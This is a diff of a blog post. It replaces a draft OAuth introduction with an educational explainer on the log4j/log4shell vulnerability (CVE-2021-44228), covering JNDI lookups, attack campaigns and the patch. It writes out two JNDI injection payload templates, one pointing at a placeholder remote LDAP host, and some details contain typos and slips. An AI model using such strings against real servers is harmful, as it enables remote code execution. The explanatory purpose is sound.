@@ -1,65 +1,71 @@
 ---
-title: "An Introduction to OAuth"
-date: 2021-12-12T11:14:57+11:00
+title: "Understanding the log4j global security incident"
+date: 2021-12-30T21:24:23+11:00
 draft: false
-image: img/Post2.jpg
-tags: ['Learning', 'Authentication']
+image: img/Post6.jpg
+tags: ['Learning', 'Vulnerability']
 ---
 
-Open Authorisation, or OAuth for short, is a way to grant third-party applications access to specific information or permissions from an account with another provider.
+## What is the log4j incident?
 
-It allows people to use the login credentials they have from one service to login to another service. For example, OAuth is commonly used when logging in with Google or Facebook accounts onto other websites that may be used less frequently, such as Canva or Grammarly.
+Apache log4j is an open-source logging framework used with the programming languages. It is a popular framework widely used across various industries, from video games such as Minecraft to hospital equipment and other programs.
 
-## What Is OAuth?
+Researchers from Alibaba Cloud Security Team discovered a vulnerability in the framework and reported it to Apache on the 24th of November 2021. The vulnerability was then released through a Twitter post to the world on the 9th of December 2021.
 
-OAuth itself is an "open standard" authorisation protocol, meaning that is it publicly available for any individual or company to implement or update. The protocol is not owned by any company, which helps prevent users from becoming trapped within a business's 'ecosystem' of technology.
+This vulnerability with log4j, tracked within the National Vulnerability Database as [**CVE-2021-44228**](https://nvd.nist.gov/vuln/detail/CVE-2021-44228), or more colloquially known as **log4shell**, comes with an ability to remotely execute code, making it very dangerous when used by cyber attackers.
 
-OAuth 2.0 is a very different version from OAuth 1.0 and 1.1. OAuth 2.0 issues ***access tokens*** to the third-party website with the approval of the user. The third-party will then use that access token to obtain the approved information it needs to provide its service to the user.
+Attackers can exploit the log4j vulnerability to perform a variety of cyber-attacks, such as force the server that is running log4j to install any software the attacker wants, including software that can completely take over the server. within a few days of the exploit being released, cybersecurity company [Akamai Technologies Inc.](https://www.akamai.com/blog/security/threat-intelligence-on-log4j-cve-key-findings-and-their-implications) tracked over **10 million attempts to exploit log4j each hour**.
 
-OAuth 2.0 in particular has a specific authorisation process depending on the device or application the user is attempting to access, such as a web page, a desktop application, smart device or a mobile phone.
+## Background Information
 
-## Benefits of using OAuth
+In Java programming, **logging** is a term to describe keeping records of all data input and output, and any changes made in an application. Logging is simply keeping a record of all the events in an application and is mainly used for debugging and tracking the history of changes.
 
-One of the major benefits of using OAuth is that the websites or application that is being accessed is given limited access to the user's data without accessing the user's credentials. The OAuth protocol allows users to specify exactly what information, and what level of permissions, they would like to grant the third-party. At no point is the third-party given access to the user's password for the service they are logging in with, wether that be gmail or facebook.
+A logging framework is usually a third-party application used to help ease and standardise the process of logging information across an application. Apache log4j is a popular and widely-used example of these third-party applications.
 
-An often overlooked advantage of using OAuth is the simplicity it brings to using multiple web-based and software applications. A good cyber security practice for any person is to keep unique passwords for every website or service they use, a practice which many people do not follow. OAuth simplifies the need for users to create multiple usernames and passwords for many different services, or more likely use the same username and password across these multiple services, which can be a security risk.
+The log4j framework can look up information, such as Event lookups, Date lookups or JNDI (Java Naming and Directory Interface) lookups, to name a few examples. It uses the JDNI API to correlate these lookups against different record providers, such as DNS (Domain Name Service), RMI (Remote Method Invocation) or the others seen in the image below. An overview of JDNI can be found [here](https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/index.html).
 
-**Add more to this paragraph**
-From the perspective of a business, implementing OAuth as the only method for users to login with alleviates the need for businesses to invest in securely storing and guarding over login credentials for those users. In the even of a cyber attack on the business, attackers will not be able to steal user's passwords as the OAuth token does not provide this when used to login. [Link](https://www.clowder.com/post/why-your-organization-should-be-using-oauth-2.0)
+{{< figure src="https://docs.oracle.com/javase/jndi/tutorial/figures/jndi/getStarted/jndiarch.jpg" title="JDNI API. Figure Source: Oracle Documentation" height="500" width="500" >}}
 
-## Disadvantages of using OAuth
+The log4shell vulnerability takes advantage of log4j not performing input validation and not sanitising any URL's passed through input messages. Log4j does not verify the JNDI and LDAP (Lightweight Directory Access Protocol) requests. Therefore, attackers can execute malicious Java code on any server, as log4j blindly trusts all user input.
 
-In May of 2017, approximately 1 million Gmail users were targeted with a phishing attack, where the attackers pretented to be either a collegue or employer of the victim and prompted them to click on a link in the email. This link would then redirect the victim to allow a malicious program disguised as a fake site called "Google Apps" to access their "email, contacts and online documents" through the OAuth protocol.
+## How log4j works
 
-While this attack wasn't a fault with the protocol itself, the easy setup and access that using OAuth grants allowed attackers to manipulate many users into granting the attackers access to their personal information.
+Log4j has a feature named **message lookup substitution**. This feature allows log4j to automatically detect strings (meaning text written by users) that point to JDNI resources. Before the latest update, this feature was enabled automatically and was partially responsible for the remote code execution vulnerability that came to be known as log4shell.
 
-Another key issue with OAuth is a result of the flexible design and implemetation of the protocol itself, due to its open-source nature. When using the protocol, user's must trust that it has been properly implemented by their service provider, as there is plenty of opportunity for security vulnerabilites to arise. OAuth 2.0 has few build-in security features, and combined with the few mandatory components needed for basic functionality of the protocol, the security of the protocol relies on robust installation and care from developers.
+The **message lookup substitution** feature in log4j had no in-built rules governing acceptable user input, and as a result would not sanitise and remove any unnecessary input, including URL's. This automatically enabled feature combined with the lack of filtering of input allowed attackers to send malicious requests to applications using log4j with little effort.
 
-## How does OAuth acutally work?
+{{< figure src="https://news.sophos.com/wp-content/uploads/2021/12/log4j_how-1.png" title="Log4j Explanied. Figure Source: SophosLabs" height="700" width="700">}}
 
-OAuth works by defining three parties that will communicate with eachother. These are the **Resource Owner**, meaning the user who owns the data, the **Client Application**, meaning the third-party who wants to access the data, and finally the **OAuth Service Provider**, meaning the website or service that controls the data, such as Gmail.
+With HTTP communications specifically, the malicious string could be sent through any part of the HTTP request that would be logged by the receiving application. As seen in the diagram above, the **User-Agent** field in the "Normal Log4j Scenario" would contain details of the user's browser. An attacker is able to modify this information and instead send a string that would invoke the JNDI interface.
 
-As mentioned previously, there are many ways that OAuth can be implemented, but the most common way is through the use of *authorisation codes* and *grant types*.
+This malicious string can be crafted in many ways, but was commonly in the form of:
 
-1. The user wants to access a third-party website and, if the third-party supports OAuth, will have give the user the option to log in with a choice of service providers.
+```text
+${jndi:[service]://[lookup address]}
+```
 
-2. 
+In this example, JNDI can call upon services such as LDAP, LDAPS, DNS or Java's RMI to assist in the lookup.
 
+The lookup address is the URL that would be queried and fetched as Java code.
 
-*All of this needs to be re-written, it is from this [link](https://auth0.com/intro-to-iam/what-is-oauth-2/)*
+Another technique would include URL-encoded payloads, this would look like:
 
-1. The Client requests authorization (authorization request) from the Authorization server, supplying the client id and secret to as identification; it also provides the scopes and an endpoint URI (redirect URI) to send the Access Token or the Authorization Code to.
-2. The Authorization server authenticates the Client and verifies that the requested scopes are permitted. 
-3. The Resource owner interacts with the Authorization server to grant access.
-4. The Authorization server redirects back to the Client with either an Authorization Code or Access Token, depending on the grant type, as it will be explained in the next section. A Refresh Token may also be returned.
-5. With the Access Token, the Client requests access to the resource from the Resource server.
+```text
+$%7Bjndi:ldap:/x.x.x.x:3339/[malicious exploit]%7D
+```
 
-## Links
+This technique is more straightforward for an attacker to execute, and involves replacing characters with UTF-8 encoded characters. The '**{**' bracket is written instead as '**%7B**', for example.
 
-[Link](https://en.wikipedia.org/wiki/OAuth)
-[Link](https://developer.okta.com/blog/2017/06/21/what-the-heck-is-oauth)
-[Link](https://aaronparecki.com/oauth-2-simplified/)
-[Link](https://www.scienceabc.com/innovation/oauth-how-does-login-with-facebook-google-work.html)
-[Link](https://stackoverflow.com/questions/7561631/oauth-2-0-benefits-and-use-cases-why)
+When the receiving server logged this malicious request, the log4j vulnerability would be triggered and the commands crafted by the attacker would be executed.
 
-.
+## What known cyberattacks resulted from log4j?
+
+Since the log4shell vulnerability is relatively simple to exploit, millions of cyber attacks have resulted from it within a few days of it being released.
+
+Microsoft has reported cyber attacks involving attackers installing crypto mining software such as XMRig cryptocurrency miner on servers. Similarly, attackers have also tried to install botnet malware on servers, such as Muhstik botnet, as well as malicious java code that can create and active a backdoor in a server for attackers to later exploit.
+
+Khonsari and Conti randomware threats have also been reported, alongside many other malwares. More information about publicly reported payloads can be found at [Symantec](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/log4j-vulnerabilities-attacks).
+
+The best fix to this vulnerability is to update all servers using Apache Log4j to version 2.15.0 or later, and to continue checking to more future updates as good practice.
+
+Tags:
